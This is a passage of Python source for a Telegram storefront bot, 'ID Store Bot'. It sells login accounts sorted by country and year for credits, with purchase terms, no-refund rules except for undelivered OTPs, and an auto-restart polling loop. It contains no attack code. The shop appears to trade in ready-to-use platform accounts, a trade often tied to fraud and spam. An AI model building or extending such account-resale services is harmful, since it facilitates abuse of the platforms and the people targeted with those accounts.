            parse_mode=ParseMode.HTML,
        )
        return

    if data.startswith("shop:buy:"):
        # Terms & Conditions gate before purchase
        await safe_query_answer(query, cache_time=0)
        _, _, country, year_token = data.split(":", 3)
        terms = (
            f"📌 <b>{to_smallcaps('Buyer Terms & Conditions')}</b>\n\n"
            f"• ✅ <b>{to_smallcaps('No refunds after purchase.')}</b>\n"
            f"• ✅ <b>{to_smallcaps('Only refund case: OTP not received.')}</b>\n"
            f"• ✅ <b>{to_smallcaps('Login immediately and use it.')}</b>\n"
            f"• ✅ <b>{to_smallcaps('By purchasing, you accept full responsibility.')}</b>\n\n"
            f"<b>{to_smallcaps('Do you agree?')}</b>"
        )
        await safe_edit(
            query.message,
            terms,
            parse_mode=ParseMode.HTML,
            reply_markup=kb(
                [
                    [
                        InlineKeyboardButton("✅ I Agree", callback_data=f"shop:agree:{country}:{year_token}"),
                        InlineKeyboardButton("❌ Decline", callback_data=f"shop:decline:{country}:{year_token}"),
                    ],
                    [InlineKeyboardButton("⬅️ Back", callback_data=f"shop:country:{country}")],
                ]
            ),
        )
        return

    if data.startswith("shop:decline:"):
        await safe_query_answer(query, "Cancelled", show_alert=False)
        # go back to year list
        _, _, country, _yt = data.split(":", 3)
        years = await repo.list_available_years_for_country(country)
        await safe_edit(
            query.message,
            f"{country}: Select year:",
            reply_markup=years_keyboard(country, years),
            parse_mode=ParseMode.HTML,
        )
        return

    if data.startswith("shop:agree:"):
        # Do NOT pre-answer this callback. We may need to show an alert popup.
        _, _, country, year_token = data.split(":", 3)
        if year_token == "none":
            year = None
        elif year_token.isdigit():
            year = int(year_token)
        else:
            year = year_token

        account, reason = await repo.buy_account_filtered(
            user_id=uid,
            username=(update.effective_user.username or ""),
            country=country,
            year=year,
        )
        if not account:
            if reason in {"insufficient_credits", "no_affordable"}:
                # Show current credits + minimum required (best effort)
                udoc = await repo.ensure_user(uid, username=update.effective_user.username)
                have = int(udoc.get("credits", 0))

                # Determine min price for this category
                if year_token == "none":
                    year_for_range = None
                elif year_token.isdigit():
                    year_for_range = int(year_token)
                else:
                    year_for_range = year_token
                pr = await repo.available_price_range(country=country, year=year_for_range)
                need = pr.get("min_price")

                if need is None:
                    await safe_query_answer(query, f"❌ Not enough credits.\nYou have: {have}", show_alert=True)
                else:
                    await safe_query_answer(query, f"❌ Not enough credits.\nYou have: {have}\nMinimum price: {int(need)}", show_alert=True)
                return
            if reason == "no_accounts":
                await safe_query_answer(query, "❌ No account left in this category.", show_alert=True)
                return
            await safe_query_answer(query, f"❌ {to_smallcaps('Purchase failed')} ({reason})", show_alert=True)
            return

        # also show policy message
        await query.message.reply_text(
            f"<b>✅ {to_smallcaps('Purchase Confirmed')}</b>\n\n"
            f"<i>⚠️ {to_smallcaps('No refunds except OTP not received')}</i>",
            parse_mode=ParseMode.HTML,
        )
        await send_purchase_details(update, context, account)
        return


def build_app() -> Application:
    require_token()

    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )

    repo = Repo(get_db())

    async def send_message(chat_id: int, text: str):
        await app.bot.send_message(chat_id=chat_id, text=text)

    account_manager = AccountManager(send_message, bot=app.bot)

    app.bot_data["repo"] = repo
    app.bot_data["account_manager"] = account_manager

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("ping", ping_cmd))
    app.add_handler(CommandHandler("bd", bd_cmd))
    app.add_handler(CallbackQueryHandler(on_callback))

    # Text for admin flows + deposit amount
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    # Media for deposit screenshots (photos and image documents)
    app.add_handler(MessageHandler(filters.PHOTO | filters.Document.IMAGE, on_media))

    app.add_error_handler(on_error)

    return app


def main() -> None:
    if not ADMIN_USER_IDS:
        logger.warning("ADMIN_USER_IDS is empty. Admin commands will be blocked.")

    # Auto-restart loop: if the bot crashes/stops after some hours due to transient
    # network/db issues, it will restart automatically.
    while True:
        try:
            app = build_app()
            print("ID Store Bot started")
            # drop_pending_updates helps if Telegram backlog is huge and bot appears unresponsive
            app.run_polling(close_loop=False, drop_pending_updates=True)
        except KeyboardInterrupt:
            raise
        except Exception as e:
            logger.exception("Bot crashed; restarting in 5 seconds: %s", e)
            import time

            time.sleep(5)

        # If run_polling returns for any reason, restart after a short delay
        import time
        time.sleep(2)


if __name__ == "__main__":
    main()
